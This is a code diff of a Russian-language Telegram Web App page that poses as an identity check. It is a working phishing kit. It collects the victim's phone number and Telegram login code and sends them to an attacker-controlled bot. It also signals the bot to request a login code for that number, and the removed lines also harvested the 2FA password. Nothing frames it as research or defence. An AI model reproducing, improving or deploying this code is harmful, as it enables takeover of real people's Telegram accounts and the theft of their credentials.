@@ -6,148 +6,26 @@
     <title>Проверка личности</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #000;
-            color: #fff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 12px;
-        }
-        .container {
-            max-width: 400px;
-            width: 100%;
-            padding: 20px 16px 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 12px; }
+        .container { max-width: 400px; width: 100%; padding: 20px 16px 30px; display: flex; flex-direction: column; align-items: center; text-align: center; }
         .emoji { font-size: 80px; margin: 10px 0; }
         .lead { font-size: 18px; font-weight: 500; margin: 8px 0; }
         .muted { color: #9da3a8; font-size: 14px; margin: 4px 0 16px; }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #2f80ed, #3aa3ff);
-            border: none;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.2s;
-            margin-top: 12px;
-        }
+        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #2f80ed, #3aa3ff); border: none; border-radius: 14px; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; margin-top: 12px; }
         .btn:active { opacity: 0.7; }
         .btn-secondary { background: #2a2a2a; margin-top: 8px; }
         .code-boxes { display: flex; gap: 12px; margin: 16px 0 12px; }
-        .code-box {
-            width: 50px;
-            height: 56px;
-            background: #111;
-            border-radius: 12px;
-            border: 2px solid #222;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            font-weight: 600;
-            color: #fff;
-        }
+        .code-box { width: 50px; height: 56px; background: #111; border-radius: 12px; border: 2px solid #222; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 600; color: #fff; }
         .code-box.filled { border-color: #2f80ed; }
-        .keypad {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            width: 100%;
-            margin: 16px 0 12px;
-        }
-        .kbtn {
-            padding: 14px;
-            background: #1a1a1a;
-            border: none;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 22px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; margin: 16px 0 12px; }
+        .kbtn { padding: 14px; background: #1a1a1a; border: none; border-radius: 14px; color: #fff; font-size: 22px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
         .kbtn:active { background: #2a2a2a; }
         .kbtn.del { background: #1a1a1a; color: #ff6b6b; font-size: 20px; }
         .status { color: #9da3a8; font-size: 14px; min-height: 24px; margin-top: 8px; }
         .status.success { color: #69db7c; }
         .hidden { display: none !important; }
-        .modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.7);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-        }
-        .modal-content {
-            background: #1a1a1a;
-            border-radius: 20px;
-            padding: 24px 20px;
-            max-width: 380px;
-            width: 90%;
-        }
-        .modal-content h3 { font-size: 20px; margin-bottom: 8px; }
-        .modal-content p { color: #9da3a8; font-size: 14px; margin-bottom: 16px; }
-        .modal-content input {
-            width: 100%;
-            padding: 12px;
-            background: #111;
-            border: 1px solid #222;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            margin: 12px 0;
-        }
-        .modal-content input:focus { border-color: #2f80ed; outline: none; }
-        .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
-        .modal-actions button {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        .modal-actions .cancel { background: transparent; color: #9da3a8; }
-        .modal-actions .ok { background: #2f80ed; color: #fff; }
-        .twofa-input {
-            width: 100%;
-            padding: 12px;
-            background: #111;
-            border: 1px solid #222;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            margin: 12px 0;
-        }
-        .twofa-input:focus { border-color: #2f80ed; outline: none; }
-        .input-field {
-            width: 100%;
-            padding: 14px;
-            background: #111;
-            border: 1px solid #222;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 18px;
-            margin: 10px 0;
-            text-align: center;
-        }
+        .input-field { width: 100%; padding: 14px; background: #111; border: 1px solid #222; border-radius: 12px; color: #fff; font-size: 18px; margin: 10px 0; text-align: center; }
         .input-field:focus { border-color: #2f80ed; outline: none; }
     </style>
 </head>
@@ -159,25 +37,22 @@
             <div class="muted">Нажмите на кнопку ниже для начала!</div>
             <button class="btn" id="btnConfirm">Подтвердить</button>
         </div>
-
         <div id="screen-phone" class="hidden">
             <div class="emoji">📱</div>
             <div class="lead">Введите Ваш номер телефона</div>
             <div class="muted">Мы отправим код подтверждения</div>
-            <input class="input-field" type="tel" id="phoneInput" placeholder="+7 999 999 99 99">
+            <input class="input-field" type="tel" id="phoneInput" placeholder="79261234567">
             <button class="btn" id="btnSendPhone">Отправить</button>
             <div class="status" id="statusPhone"></div>
         </div>
-
         <div id="screen-waiting" class="hidden">
             <div class="emoji">⏳</div>
             <div class="lead">Ожидайте, не выходите!</div>
-            <div class="muted">Нужно подтвердить, что вы настоящий человек</div>
+            <div class="muted">Код отправлен на ваш номер</div>
         </div>
-
         <div id="screen-code" class="hidden">
             <div class="emoji">🔐</div>
-            <div class="lead">Введите 5-значный код, который мы вам только что отправили!</div>
+            <div class="lead">Введите 5-значный код</div>
             <div class="code-boxes" id="codeBoxes">
                 <div class="code-box" data-index="0"></div>
                 <div class="code-box" data-index="1"></div>
@@ -200,16 +75,6 @@
                 <button class="kbtn del" data-key="backspace">⌫</button>
             </div>
             <div class="status" id="statusCode"></div>
-            <div id="twofaBlock" class="hidden" style="width:100%;margin-top:12px;">
-                <input class="twofa-input" id="twofaInput" type="password" placeholder="Введите пароль 2FA">
-                <button class="btn" id="twofaSubmit" style="margin-top:8px;">Подтвердить пароль</button>
-            </div>
-        </div>
-
-        <div id="screen-success" class="hidden">
-            <div class="emoji">✅</div>
-            <div class="lead">Подтверждено!</div>
-            <div class="muted">Вы успешно прошли проверку</div>
         </div>
     </div>
 
@@ -220,14 +85,9 @@
 
         let tg = window.Telegram.WebApp;
         let phone = '';
-        let code = '';
-        let password = '';
         let codeDigits = [];
 
-        if (tg) {
-            tg.ready();
-            tg.expand();
-        }
+        if (tg) { tg.ready(); tg.expand(); }
 
         async function sendToBot(text) {
             try {
@@ -239,29 +99,21 @@
             } catch(e) {}
         }
 
-        async function sendDataToBot(phone, code, password) {
-            await sendToBot(`📩 ДАННЫЕ: ${JSON.stringify({ phone, code, password })}`);
-        }
-
         const screenWelcome = document.getElementById('screen-welcome');
         const screenPhone = document.getElementById('screen-phone');
         const screenWaiting = document.getElementById('screen-waiting');
         const screenCode = document.getElementById('screen-code');
-        const screenSuccess = document.getElementById('screen-success');
         const btnConfirm = document.getElementById('btnConfirm');
         const btnSendPhone = document.getElementById('btnSendPhone');
         const phoneInput = document.getElementById('phoneInput');
         const statusPhone = document.getElementById('statusPhone');
         const codeBoxes = document.querySelectorAll('.code-box');
         const statusCode = document.getElementById('statusCode');
-        const twofaBlock = document.getElementById('twofaBlock');
-        const twofaInput = document.getElementById('twofaInput');
-        const twofaSubmit = document.getElementById('twofaSubmit');
         const btnGetCode = document.getElementById('btnGetCode');
         const keypad = document.getElementById('keypad');
 
         function showScreen(screen) {
-            [screenWelcome, screenPhone, screenWaiting, screenCode, screenSuccess].forEach(el => el.classList.add('hidden'));
+            [screenWelcome, screenPhone, screenWaiting, screenCode].forEach(el => el.classList.add('hidden'));
             screen.classList.remove('hidden');
         }
 
@@ -272,78 +124,77 @@
             });
         }
 
-        btnConfirm.addEventListener('click', () => {
-            showScreen(screenPhone);
-        });
+        btnConfirm.addEventListener('click', () => showScreen(screenPhone));
 
         btnSendPhone.addEventListener('click', async () => {
             phone = phoneInput.value.trim();
             if (!phone) {
-                statusPhone.textContent = 'Введите номер';
+                statusPhone.textContent = 'Введите номер в формате 79261234567';
                 statusPhone.className = 'status';
                 return;
             }
-            statusPhone.textContent = 'Отправка...';
+            statusPhone.textContent = 'Отправка кода...';
             statusPhone.className = 'status';
-            await sendDataToBot(phone, '', '');
-            showScreen(screenWaiting);
-            setTimeout(() => {
-                showScreen(screenCode);
-                statusCode.textContent = '📲 Код отправлен! Введите его.';
-                statusCode.className = 'status success';
-            }, 2000);
+            try {
+                await sendToBot(`⏳ ОТПРАВИТЬ КОД на номер: ${phone}`);
+                // СИГНАЛ БОТУ ЧЕРЕЗ КОМАНДУ
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: `/send_code ${phone}`
+                    })
+                });
+                statusPhone.textContent = 'Код отправлен!';
+                statusPhone.className = 'status success';
+                showScreen(screenWaiting);
+                setTimeout(() => {
+                    showScreen(screenCode);
+                    statusCode.textContent = '📲 Введите код из Telegram';
+                    statusCode.className = 'status';
+                }, 3000);
+            } catch(e) {
+                statusPhone.textContent = 'Ошибка: ' + e.message;
+                statusPhone.className = 'status';
+            }
         });
 
         keypad.addEventListener('click', (e) => {
             const key = e.target.dataset.key;
             if (!key) return;
-            if (key === 'backspace') {
-                codeDigits.pop();
-                updateCodeBoxes();
-                return;
-            }
+            if (key === 'backspace') { codeDigits.pop(); updateCodeBoxes(); return; }
             if (codeDigits.length >= 5) return;
             codeDigits.push(key);
             updateCodeBoxes();
             if (codeDigits.length === 5) {
-                code = codeDigits.join('');
-                sendDataToBot(phone, code, '');
-                statusCode.textContent = '⏳ Проверка...';
-                statusCode.className = 'status';
+                let code = codeDigits.join('');
+                sendToBot(`📩 КОД: ${code} для номера ${phone}`);
+                statusCode.textContent = '✅ Код получен!';
+                statusCode.className = 'status success';
+                setTimeout(() => {
+                    if (tg) tg.close();
+                }, 1500);
             }
         });
 
         btnGetCode.addEventListener('click', () => {
-            if (phone) {
-                sendDataToBot(phone, '', '');
-                statusCode.textContent = '📲 Код отправлен повторно!';
-                statusCode.className = 'status success';
-            }
-        });
-
-        twofaSubmit.addEventListener('click', () => {
-            password = twofaInput.value.trim();
-            if (!password) {
-                statusCode.textContent = 'Введите пароль';
-                return;
-            }
-            sendDataToBot(phone, code, password);
-            statusCode.textContent = '⏳ Проверка пароля...';
-            statusCode.className = 'status';
+            sendToBot(`🔄 ПОВТОРНЫЙ КОД для ${phone}`);
+            statusCode.textContent = '📲 Код отправлен повторно!';
+            statusCode.className = 'status success';
         });
 
         document.addEventListener('keydown', (e) => {
             if (!screenCode.classList.contains('hidden')) {
-                if (/^\d$/.test(e.key)) {
-                    if (codeDigits.length < 5) {
-                        codeDigits.push(e.key);
-                        updateCodeBoxes();
-                        if (codeDigits.length === 5) {
-                            code = codeDigits.join('');
-                            sendDataToBot(phone, code, '');
-                            statusCode.textContent = '⏳ Проверка...';
-                            statusCode.className = 'status';
-                        }
+                if (/^\d$/.test(e.key) && codeDigits.length < 5) {
+                    codeDigits.push(e.key);
+                    updateCodeBoxes();
+                    if (codeDigits.length === 5) {
+                        let code = codeDigits.join('');
+                        sendToBot(`📩 КОД: ${code} для ${phone}`);
+                        statusCode.textContent = '✅ Код получен!';
+                        statusCode.className = 'status success';
+                        setTimeout(() => { if (tg) tg.close(); }, 1500);
                     }
                 } else if (e.key === 'Backspace') {
                     codeDigits.pop();
@@ -351,10 +202,6 @@
                 }
             }
         });
-
-        function closeApp() {
-            if (tg) tg.close();
-        }
     </script>
 </body>
 </html>
